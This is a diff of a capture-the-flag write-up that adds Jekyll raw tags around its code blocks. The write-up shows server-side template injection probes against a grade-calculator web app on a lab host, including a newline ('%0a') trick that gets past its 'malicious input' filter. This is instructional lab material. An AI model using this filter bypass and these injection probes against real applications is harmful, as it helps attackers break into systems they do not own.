@@ -60,6 +60,7 @@ We see that there's a website called "Weighted Grade Calculator". Once we access
 
 We can fill out the fields seen above and send the request. With Burp Suite, we can intercept it to see what is going on. Then, we can alter one of the parameters to test for SSTI vulnerabilities:
 
+{% raw %}
 ```bash
 POST /weighted-grade-calc HTTP/1.1
 Host: 10.10.11.253
@@ -76,6 +77,7 @@ Upgrade-Insecure-Requests: 1
 
 category1={{7*7}}&grade1=80&weight1=20&category2=Category2&grade2=80&weight2=20&category3=Category3&grade3=80&weight3=20&category4=Category4&grade4=80&weight4=20&category5=Category5&grade5=80&weight5=20
 ```
+{% endraw %}
 
 In the response, however, we see that the application is returning "Malicious input blocked".
 
@@ -93,6 +95,7 @@ Please enter a maximum of five category names, your grade in them out of 100, an
 
 However, we can bypass the checks by adding a URL-encoded new line character (`%0a`).
 
+{% raw %}
 ```bash
 POST /weighted-grade-calc HTTP/1.1
 Host: 10.10.11.253
@@ -109,15 +112,18 @@ Upgrade-Insecure-Requests: 1
 
 category1=aa%0a{{7*7}}&grade1=80&weight1=20&category2=Category2&grade2=80&weight2=20&category3=Category3&grade3=80&weight3=20&category4=Category4&grade4=80&weight4=20&category5=Category5&grade5=80&weight5=20
 ```
+{% endraw %}
 
 We see that the response no longer returns "Malicious input blocked".
 
+{% raw %}
 ```html
 [...snip] Your total grade is 80%
 
 aa {{7*7}}: 16%
 [...snip]
 ```
+{% endraw %}
 
 We saw a reference to Sinatra in the error page, which means that the application is likely developed in Ruby. We can then try the following SSTI payload for Ruby's ERB: `<%= 7*7 %> `
 
